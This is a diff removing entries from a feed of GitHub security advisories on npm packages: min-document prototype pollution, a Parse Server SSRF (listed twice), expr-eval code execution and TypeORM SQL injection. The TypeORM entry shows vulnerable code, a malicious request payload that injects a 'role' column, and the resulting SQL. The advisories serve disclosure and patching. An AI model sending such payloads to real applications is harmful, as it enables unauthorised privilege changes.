-        <id>https://github.com/advisories/GHSA-rx8g-88g5-qh64</id>
-        <link href="https://github.com/advisories/GHSA-rx8g-88g5-qh64"/>
-        <updated>2025-11-06T18:20:26.000Z</updated>
-        <content type="html"><![CDATA[<p>A vulnerability exists in the 'min-document' package prior to version 2.19.1, stemming from improper handling of namespace operations in the removeAttributeNS method. By processing malicious input involving the <strong>proto</strong> property, an attacker can manipulate the prototype chain of JavaScript objects, leading to denial of service or arbitrary code execution. This issue arises from insufficient validation of attribute namespace removal operations, allowing unintended modification of critical object prototypes. The vulnerability is addressed in version 2.19.1.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-57352">https://nvd.nist.gov/vuln/detail/CVE-2025-57352</a></li>
-<li><a href="https://github.com/Raynos/min-document/issues/54">https://github.com/Raynos/min-document/issues/54</a></li>
-<li><a href="https://github.com/VulnSageAgent/PoCs/tree/main/JavaScript/prototype-pollution/CVE-2025-57352">https://github.com/VulnSageAgent/PoCs/tree/main/JavaScript/prototype-pollution/CVE-2025-57352</a></li>
-<li><a href="https://github.com/Raynos/min-document/pull/55">https://github.com/Raynos/min-document/pull/55</a></li>
-<li><a href="https://github.com/Raynos/min-document/commit/fe32e8da464cef622528725f647029a8fd7d95a6">https://github.com/Raynos/min-document/commit/fe32e8da464cef622528725f647029a8fd7d95a6</a></li>
-<li><a href="https://github.com/advisories/GHSA-rx8g-88g5-qh64">https://github.com/advisories/GHSA-rx8g-88g5-qh64</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-rx8g-88g5-qh64</uri>
-        </author>
-        <category label="severity" term="LOW"/>
-        <published>2025-09-24T18:30:31.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[parse-server] Parse Server Vulnerable to Server-Side Request Forgery (SSRF) in File Upload via URI Format]]></title>
-        <id>https://github.com/advisories/GHSA-x4qj-2f4q-r4rx</id>
-        <link href="https://github.com/advisories/GHSA-x4qj-2f4q-r4rx"/>
-        <updated>2025-11-07T20:31:44.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
-<p>A Server-Side Request Forgery (SSRF) vulnerability in the file upload functionality when trying to upload a <code>Parse.File</code> with <code>uri</code> parameter allows to execute an arbitrary URI. The vulnerability stems from a file upload feature in which Parse Server retrieves the file data from a URI that is provided in the request. A request to the provided URI is executed, but the response is not stored in Parse Server's file storage as the server crashes upon receiving the response.</p>
-<h3 id="patches">Patches</h3>
-<p>The feature has been implemented in Parse Server 4.2.0 but never worked and reliably crashes the server when trying to use it due to a bug in its implementation. Since the feature is not currently working, and due to its risky nature, it has been removed to address the vulnerability.</p>
-<h3 id="workarounds">Workarounds</h3>
-<p>None.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/parse-community/parse-server/security/advisories/GHSA-x4qj-2f4q-r4rx">https://github.com/parse-community/parse-server/security/advisories/GHSA-x4qj-2f4q-r4rx</a></li>
-<li><a href="https://github.com/parse-community/parse-server/pull/9903">https://github.com/parse-community/parse-server/pull/9903</a></li>
-<li><a href="https://github.com/parse-community/parse-server/pull/9904">https://github.com/parse-community/parse-server/pull/9904</a></li>
-<li><a href="https://github.com/parse-community/parse-server/commit/8bbe3efbcf4a3b66f4a8db9bfb18cd98c050db51">https://github.com/parse-community/parse-server/commit/8bbe3efbcf4a3b66f4a8db9bfb18cd98c050db51</a></li>
-<li><a href="https://github.com/parse-community/parse-server/commit/97763863b72689a29ad7a311dfb590c3e3c50585">https://github.com/parse-community/parse-server/commit/97763863b72689a29ad7a311dfb590c3e3c50585</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-64430">https://nvd.nist.gov/vuln/detail/CVE-2025-64430</a></li>
-<li><a href="https://github.com/advisories/GHSA-x4qj-2f4q-r4rx">https://github.com/advisories/GHSA-x4qj-2f4q-r4rx</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-x4qj-2f4q-r4rx</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2025-11-05T19:52:27.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[parse-server] Parse Server Vulnerable to Server-Side Request Forgery (SSRF) in File Upload via URI Format]]></title>
-        <id>https://github.com/advisories/GHSA-x4qj-2f4q-r4rx</id>
-        <link href="https://github.com/advisories/GHSA-x4qj-2f4q-r4rx"/>
-        <updated>2025-11-07T20:31:44.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
-<p>A Server-Side Request Forgery (SSRF) vulnerability in the file upload functionality when trying to upload a <code>Parse.File</code> with <code>uri</code> parameter allows to execute an arbitrary URI. The vulnerability stems from a file upload feature in which Parse Server retrieves the file data from a URI that is provided in the request. A request to the provided URI is executed, but the response is not stored in Parse Server's file storage as the server crashes upon receiving the response.</p>
-<h3 id="patches">Patches</h3>
-<p>The feature has been implemented in Parse Server 4.2.0 but never worked and reliably crashes the server when trying to use it due to a bug in its implementation. Since the feature is not currently working, and due to its risky nature, it has been removed to address the vulnerability.</p>
-<h3 id="workarounds">Workarounds</h3>
-<p>None.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/parse-community/parse-server/security/advisories/GHSA-x4qj-2f4q-r4rx">https://github.com/parse-community/parse-server/security/advisories/GHSA-x4qj-2f4q-r4rx</a></li>
-<li><a href="https://github.com/parse-community/parse-server/pull/9903">https://github.com/parse-community/parse-server/pull/9903</a></li>
-<li><a href="https://github.com/parse-community/parse-server/pull/9904">https://github.com/parse-community/parse-server/pull/9904</a></li>
-<li><a href="https://github.com/parse-community/parse-server/commit/8bbe3efbcf4a3b66f4a8db9bfb18cd98c050db51">https://github.com/parse-community/parse-server/commit/8bbe3efbcf4a3b66f4a8db9bfb18cd98c050db51</a></li>
-<li><a href="https://github.com/parse-community/parse-server/commit/97763863b72689a29ad7a311dfb590c3e3c50585">https://github.com/parse-community/parse-server/commit/97763863b72689a29ad7a311dfb590c3e3c50585</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-64430">https://nvd.nist.gov/vuln/detail/CVE-2025-64430</a></li>
-<li><a href="https://github.com/advisories/GHSA-x4qj-2f4q-r4rx">https://github.com/advisories/GHSA-x4qj-2f4q-r4rx</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-x4qj-2f4q-r4rx</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2025-11-05T19:52:27.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[expr-eval] expr-eval does not restrict functions passed to the evaluate function]]></title>
-        <id>https://github.com/advisories/GHSA-jc85-fpwf-qm7x</id>
-        <link href="https://github.com/advisories/GHSA-jc85-fpwf-qm7x"/>
-        <updated>2025-11-10T19:06:04.000Z</updated>
-        <content type="html"><![CDATA[<p>The expr-eval library is a JavaScript expression parser and evaluator designed to safely evaluate mathematical expressions with user-defined variables. However, due to insufficient input validation, an attacker can pass a crafted variables object into the evaluate() function and trigger arbitrary code execution.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-12735">https://nvd.nist.gov/vuln/detail/CVE-2025-12735</a></li>
-<li><a href="https://github.com/silentmatt/expr-eval/pull/288">https://github.com/silentmatt/expr-eval/pull/288</a></li>
-<li><a href="https://github.com/jorenbroekema/expr-eval">https://github.com/jorenbroekema/expr-eval</a></li>
-<li><a href="https://github.com/silentmatt/expr-eval">https://github.com/silentmatt/expr-eval</a></li>
-<li><a href="https://www.npmjs.com/package/expr-eval">https://www.npmjs.com/package/expr-eval</a></li>
-<li><a href="https://www.npmjs.com/package/expr-eval-fork">https://www.npmjs.com/package/expr-eval-fork</a></li>
-<li><a href="https://github.com/jorenbroekema/expr-eval/commit/1d71bb2ca8f98df8de00e9cc4de8fdd468a7ad43">https://github.com/jorenbroekema/expr-eval/commit/1d71bb2ca8f98df8de00e9cc4de8fdd468a7ad43</a></li>
-<li><a href="https://github.com/jorenbroekema/expr-eval/blob/460b820ba01c5aca6c5d84a7d4f1fa5d1913c67b/test/security.js">https://github.com/jorenbroekema/expr-eval/blob/460b820ba01c5aca6c5d84a7d4f1fa5d1913c67b/test/security.js</a></li>
-<li><a href="https://www.kb.cert.org/vuls/id/263614">https://www.kb.cert.org/vuls/id/263614</a></li>
-<li><a href="https://github.com/advisories/GHSA-jc85-fpwf-qm7x">https://github.com/advisories/GHSA-jc85-fpwf-qm7x</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-jc85-fpwf-qm7x</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2025-11-05T03:30:23.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[typeorm] TypeORM vulnerable to SQL injection via crafted request to repository.save or repository.update]]></title>
-        <id>https://github.com/advisories/GHSA-q2pj-6v73-8rgj</id>
-        <link href="https://github.com/advisories/GHSA-q2pj-6v73-8rgj"/>
-        <updated>2025-10-31T17:38:01.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>SQL Injection vulnerability in TypeORM before 0.3.26 via crafted request to repository.save or repository.update due to the sqlstring call using stringifyObjects default to false.</p>
-<h3 id="details">Details</h3>
-<p>Vulnerable Code:</p>
-<pre><code class="language-js">const { username, city, name} = req.body;
-const updateData = {
-    username,
-    city,
-    name,
-    id:userId
-  }; // Developer aims to only allow above three fields to be updated    
-const result = await userRepo.save(updateData);
-</code></pre>
-<p>Intended Payload (non-malicious):</p>
-<p><code>username=myusername&amp;city=Riga&amp;name=Javad</code></p>
-<p><em>OR</em></p>
-<p><code>{username:\"myusername\",phone:12345,name:\"Javad\"} </code></p>
-<p>SQL query produced:</p>
-<pre><code class="language-sql">UPDATE `user` 
-SET `username` = 'myusername', 
-    `city` = 'Riga', 
-    `name` = 'Javad' 
-WHERE `id` IN (1);
-</code></pre>
-<p>Malicious Payload:</p>
-<p><code>username=myusername&amp;city[name]=Riga&amp;city[role]=admin </code></p>
-<p><em>OR</em></p>
-<p><code>{username:\"myusername\",city:{name:\"Javad\",role:\"admin\"}} </code></p>
-<p>SQL query produced with Injected Column:</p>
-<pre><code class="language-sql">UPDATE `user` 
-SET `username` = 'myusername', 
-    `city` = `name` = 'Javad', 
-    `role` = 'admin' 
-WHERE `id` IN (1);
-</code></pre>
-<p><em>Above query is valid as <code>city</code> = <code>name</code> = <code>Javad</code> is a boolean expression resulting in <code>city</code> = 1 (false). “role” column is injected and updated.</em></p>
-<p>Underlying issue was due to TypeORM using mysql2 <a href="https://github.com/typeorm/typeorm/blob/0.3.25/src/driver/mysql/MysqlConnectionOptions.ts">without specifying a value for the stringifyObjects option</a>. In both mysql and mysql2 this <a href="https://github.com/sidorares/node-mysql2/blob/e359f454a76ba5dc31b91adf7bdb4099ca317bb5/lib/connection_config.js#L124">option defaults to false</a>. This option is then passed into <a href="https://github.com/sidorares/node-mysql2/blob/e359f454a76ba5dc31b91adf7bdb4099ca317bb5/lib/base/connection.js#L524">SQLString library as false</a>. This results in sqlstring <a href="https://github.com/mysqljs/sqlstring/blob/cd528556b4b6bcf300c3db515026935dedf7cfa1/lib/SqlString.js#L54">parsing objects in a strange way using objectToValues.</a></p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-60542">https://nvd.nist.gov/vuln/detail/CVE-2025-60542</a></li>
-<li><a href="https://github.com/typeorm/typeorm/pull/11574">https://github.com/typeorm/typeorm/pull/11574</a></li>
-<li><a href="https://github.com/typeorm/typeorm/releases/tag/0.3.26">https://github.com/typeorm/typeorm/releases/tag/0.3.26</a></li>
-<li><a href="https://github.com/typeorm/typeorm/releases?q=security&amp;expanded=true">https://github.com/typeorm/typeorm/releases?q=security&amp;expanded=true</a></li>
-<li><a href="https://medium.com/@alizada.cavad/cve-2025-60542-typeorm-mysql-sqli-0-3-25-a1b32bc60453">https://medium.com/@alizada.cavad/cve-2025-60542-typeorm-mysql-sqli-0-3-25-a1b32bc60453</a></li>
-<li><a href="https://github.com/typeorm/typeorm/commit/d57fe3bd8578b0b8f9847647fd046bccf825a7ef">https://github.com/typeorm/typeorm/commit/d57fe3bd8578b0b8f9847647fd046bccf825a7ef</a></li>
-<li><a href="https://github.com/mysqljs/sqlstring/blob/cd528556b4b6bcf300c3db515026935dedf7cfa1/lib/SqlString.js#L54">https://github.com/mysqljs/sqlstring/blob/cd528556b4b6bcf300c3db515026935dedf7cfa1/lib/SqlString.js#L54</a></li>
-<li><a href="https://github.com/sidorares/node-mysql2/blob/e359f454a76ba5dc31b91adf7bdb4099ca317bb5/lib/base/connection.js#L524">https://github.com/sidorares/node-mysql2/blob/e359f454a76ba5dc31b91adf7bdb4099ca317bb5/lib/base/connection.js#L524</a></li>
-<li><a href="https://github.com/sidorares/node-mysql2/blob/e359f454a76ba5dc31b91adf7bdb4099ca317bb5/lib/connection_config.js#L124">https://github.com/sidorares/node-mysql2/blob/e359f454a76ba5dc31b91adf7bdb4099ca317bb5/lib/connection_config.js#L124</a></li>
-<li><a href="https://github.com/typeorm/typeorm/blob/0.3.25/src/driver/mysql/MysqlConnectionOptions.ts">https://github.com/typeorm/typeorm/blob/0.3.25/src/driver/mysql/MysqlConnectionOptions.ts</a></li>
-<li><a href="https://github.com/advisories/GHSA-q2pj-6v73-8rgj">https://github.com/advisories/GHSA-q2pj-6v73-8rgj</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-q2pj-6v73-8rgj</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2025-10-29T18:30:33.000Z</published>
     </entry>
 </feed>
